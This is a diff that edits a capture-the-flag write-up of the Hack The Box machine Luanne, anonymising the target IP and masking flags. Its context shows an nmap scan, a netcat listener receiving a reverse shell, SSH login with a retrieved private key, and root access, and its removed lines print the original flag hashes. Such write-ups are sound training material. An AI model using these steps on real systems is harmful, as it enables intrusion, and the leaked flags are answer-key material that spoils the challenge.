@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Luanne
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-luanne-infocard.png)
-
 This easy difficulty BSD system...Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -38,14 +36,14 @@ doas whoami
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.218`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/luanne]
-└─$ nmap -sCV -n -p- -Pn -v -oA luanne 10.10.10.218
+└─$ nmap -sCV -n -p- -Pn -v -oA luanne <YOUR_IP>
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 19:09 EDT
-Nmap scan report for 10.10.10.218
+Nmap scan report for <YOUR_IP>
 Host is up (0.064s latency).
 Not shown: 65532 closed ports
 PORT     STATE SERVICE VERSION
@@ -80,7 +78,7 @@ Nmap only showed three ports were open on this machine: 22- SSH, 80 - HTTP, and 
 
 ### Port 80 - HTTP
 
-I started out my enumeration by navigating to `10.10.10.218` in my browser.
+I started out my enumeration by navigating to `<YOUR_IP>` in my browser.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-unauth.png)
 
@@ -236,7 +234,7 @@ Script started, output log file is 'luanne-init'.
 └─$ bash
 zweilos@kali:~/htb/luanne$ nc -lvnp 4242
 listening on [any] 4242 ...
-connect to [10.10.14.187] from (UNKNOWN) [10.10.10.218] 54839
+connect to [10.10.14.187] from (UNKNOWN) [<YOUR_IP>] 54839
 sh: can't access tty; job control turned off
 $ id && hostname
 uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
@@ -601,7 +599,7 @@ I was finally able to get it by removing the specification for curl to interpret
 
 ```text
 zweilos@kali:~/htb/luanne$ chmod 600 r.michaels.key 
-zweilos@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@10.10.10.218
+zweilos@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@<YOUR_IP>
 Last login: Sat Mar 27 21:16:20 2021 from 10.10.14.220
 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
 
@@ -626,7 +624,7 @@ dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
 dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
 -r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
 luanne$ cat user.txt
-ea5f0ce6a917b0be1eabc7f9218febc0
+****
 ```
 
 got the user.txt flag
@@ -759,7 +757,6 @@ cities = {"London", "Manchester", "Birmingham", "Leeds", "Glasgow", "Southampton
 
 weather_desc = {"sunny", "cloudy", "partially cloudy", "rainy", "snowy"}
 
-
 function valid_city(cities, city)
     for i, v in ipairs(cities) do
         if v == city
@@ -769,7 +766,6 @@ function valid_city(cities, city)
     end
     return false
 end
-
 
 function forecast(env, headers, query)
     if query and query["city"]
@@ -899,7 +895,7 @@ drwxr-xr-x  21 root  wheel   512 Sep 16  2020 ..
 # cat root      
 cat: root: No such file or directory
 # cat root.txt
-7a9b5c206e8e8ba09bb99bd113675f66
+****
 # cat cleanup.sh
 #!/bin/sh
 
@@ -909,7 +905,3 @@ cat: root: No such file or directory
 ```
 
 Note: `/etc/master.passwd` is where password hashes are stored in BSD, not /etc/shadow
-
-Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
